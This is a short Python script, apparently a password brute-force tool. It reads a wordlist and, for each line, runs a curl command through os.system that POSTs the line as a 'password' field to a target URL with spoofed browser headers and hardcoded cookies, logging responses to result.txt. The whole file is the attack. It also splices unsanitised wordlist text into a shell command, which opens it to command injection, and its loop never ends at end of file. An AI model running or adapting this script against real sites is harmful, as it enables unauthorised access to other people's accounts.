#! /usr/bin/env python3
import os
import sys

def main():

    urlTarget = str(sys.argv[1])
    filePath = str(sys.argv[2])
    os.system("echo '' > result.txt")
    
    with open(filePath) as f:
        cmd = "curl '" + urlTarget + "' -H 'Host: " + urlTarget + "' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: " + urlTarget + "' -H 'Cookie: _ga=GA1.2.241655946.1557596937; _gid=GA1.2.198210207.1557596937' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data 'password="

        while True:
            try:
                x = f.readline()
                result = os.system(cmd +  x + "' >> result.txt")
            except:
                False

if __name__ == "__main__":
    main()
